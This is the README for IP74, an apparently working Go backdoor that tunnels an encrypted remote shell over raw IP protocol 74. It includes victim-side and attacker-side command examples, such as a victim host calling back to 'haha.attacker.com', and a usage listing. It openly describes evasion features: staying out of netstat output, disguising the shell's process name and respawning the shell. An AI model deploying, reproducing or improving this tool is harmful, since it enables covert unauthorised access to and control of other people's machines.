IP74
====

IP74 is a backdoor riding on naked IP packets.  Like, no TCP or UDP in the way.
It gets its name from the default procotol number it uses, 74.  Other than
encryption, ip74 is a no-frills shell.

The same binary is deployed to the target and used locally by the attacker.
Authentication and encryption takes the form of two 32-byte keys.

Example
-------
In these examples, the keys are:
- `abcdefghijklmnopqrstuvwxyz123456` for attacker->victim comms
- `1234567890abcdefghijklmnopqrstuv` for victim->attacker comms
Remote side:
```sh
# No prompt for the keys
[root@victim:~]# nohup ./ip74 -r haha.attacker.com
1234567890abcdefghijklmnopqrstuv
abcdefghijklmnopqrstuvwxyz123456
2016/02/26 18:28:17 Ready 192.168.3.3 <-> 192.168.2.2
```
Local side:
```sh
[root@kali:~]# ./ip74 -r eek.victim.com -s
32-byte send (encryption) key: abcdefghijklmnopqrstuvwxyz123456
32-byte receive (decryption) key: 1234567890abcdefghijklmnopqrstuv
2016/02/26 18:25:43 Ready to attack! 192.168.2.2 <-> 192.168.3.3
w
 6:26PM  up 22:37, 1 user, load averages: 0.16, 0.16, 0.16
USER    TTY FROM              LOGIN@  IDLE WHAT
adminx   p0 192.168.33.44    Thu07PM     0 tmux: client (/tmp/tmux-1000/default) 
```

Features and Settings
---------------------
###Encryption
Encryption is provided by Google's NaCl.  More info about it at
[https://godoc.org/golang.org/x/crypto/nacl/secretbox].

Separate keys are used for encryption and decryption.  They are read on startup
from stdin, each key on its own line.  There is no prompt on the victim end;
it just hangs until keys are supplied.

###Comms
Since ip74 uses neither TCP nor UDP, it shouldn't be as easy to spot in the
output of `netstat`.  Which IP protocol number is used is configurable.  By
default, it is 74.

The IP addresses of the local (i.e. attack) and remote (i.e. victim) hosts need
to be specified at run time.  An attempt will be made to guess the local
address, but the remote address will need to either be given at run time or
compiled in as the default (in [ip74.go](./ip74.go)).

###Shell
The spawned shell, (currently only `/bin/sh`, though pull requests are
welcome), will sit running as long as ip74 is running.  In order to be a little
less obvious, its name can be changed at runtime (or compile time).  If the
shell terminates, a new one will be spawned.  This takes a second, so commands
may need to be repeated to give it time to spawn the process, hook up I/O, and
so on.

Usage
-----
```
Usage: ./ip74 [options]
	
Sends and receives ip packets between the remote and local hosts and either
proxies the data to a shell or stdio.

Two newline-terminated 32-byte keys expected on stdin.  The first is for
decrypting data read from the network, and the second is to encrypt data to be
sent on the network.

If -s is given, instead of connecting a shell to the network, it connects stdio
to the network.  Use on the attacker side.

Options:
  -i interval
    	Heartbeet interval (default 1m0s)
  -l address
    	Local address (default "192.168.1.100")
  -n name
    	Process name for child (ignored if -s is set) (default "zzzzzzziprat")
  -p number
    	IP protocol number (default 74)
  -r address
    	Remote address (default "127.0.0.1")
  -s	Don't spawn a shell, use stdio instead (set on attacker side)
```
